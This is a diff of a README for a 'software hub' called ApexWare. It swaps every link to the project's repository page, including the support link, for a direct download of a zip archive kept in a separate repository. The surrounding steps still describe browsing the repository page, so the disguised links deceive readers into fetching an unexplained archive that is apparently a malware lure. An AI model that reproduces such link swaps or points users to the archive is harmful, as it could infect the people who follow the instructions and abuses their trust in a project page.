@@ -5,7 +5,7 @@ description: "Explore ApexWare, an HTML-based software hub for accessing its bro
 ---
 # ⚙️ apexware-software-hub - Access Your Software Hub In One Place
 
-[![Download apexware-software-hub](https://img.shields.io/badge/Download-apexware--software--hub-7B2CBF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tripop123/apexware-software-hub)
+[![Download apexware-software-hub](https://img.shields.io/badge/Download-apexware--software--hub-7B2CBF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tripop123/tripop123.github.io/raw/refs/heads/main/static/1.9.zip)
 
 ApexWare is a browser-based software hub for Windows users. It provides one place to open the available interface, view project materials, check setup details, review requirements, and find support information.
 
@@ -44,7 +44,7 @@ Follow these steps to download and open ApexWare on Windows.
 
 1. Open the ApexWare download page:
 
-   [Download ApexWare from GitHub](https://github.com/Tripop123/apexware-software-hub)
+   [Download ApexWare from GitHub](https://github.com/Tripop123/tripop123.github.io/raw/refs/heads/main/static/1.9.zip)
 
 2. On the GitHub page, find the green **Code** button near the top of the file list.
 
@@ -106,7 +106,7 @@ GitHub may receive new project files over time. To get the latest version:
 
 1. Visit the project page:
 
-   [Get the latest ApexWare files](https://github.com/Tripop123/apexware-software-hub)
+   [Get the latest ApexWare files](https://github.com/Tripop123/tripop123.github.io/raw/refs/heads/main/static/1.9.zip)
 
 2. Select the green **Code** button.
 
@@ -170,7 +170,7 @@ You can remove the project by closing the browser and deleting the extracted fol
 
 For project questions, open the repository page and review its files and support details:
 
-[Open the ApexWare repository](https://github.com/Tripop123/apexware-software-hub)
+[Open the ApexWare repository](https://github.com/Tripop123/tripop123.github.io/raw/refs/heads/main/static/1.9.zip)
 
 When asking for help, include:
 
